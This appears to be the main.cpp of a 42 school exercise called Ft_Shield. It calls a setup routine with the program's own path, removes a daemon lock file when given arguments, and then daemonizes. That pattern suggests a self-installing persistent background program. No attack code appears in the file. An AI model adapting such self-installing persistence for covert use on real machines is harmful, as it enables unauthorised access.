/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.cpp                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: halvarez <halvarez@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/10/18 16:20:01 by halvarez          #+#    #+#             */
/*   Updated: 2023/10/31 17:10:14 by halvarez         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <iostream>
#include <string>

#include "Ft_Shield.hpp"

int main(int argc, char **argv)
{
	Ft_Shield	shield;

	if (argc == 1)
	{
		std::cout << "halvarez" << std::endl;
		shield.setup(argv[0]);
	}
	else
		remove(DAEMON_LOCK_FILE);
	shield.daemonize();
	return 0;
}
